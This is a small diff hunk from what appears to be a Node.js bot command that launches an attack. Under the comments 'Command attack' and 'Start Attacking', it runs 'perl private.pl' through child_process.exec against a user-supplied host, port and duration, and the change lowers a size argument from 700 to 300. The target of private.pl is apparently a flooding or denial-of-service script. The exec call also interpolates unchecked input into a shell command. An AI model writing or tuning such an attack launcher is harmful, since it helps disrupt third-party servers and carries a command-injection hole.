@@ -69,7 +69,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl private.pl ${host} ${port} 700 ${time}`, (error, stdout, stderr) => {
+exec(`perl private.pl ${host} ${port} 300 ${time}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
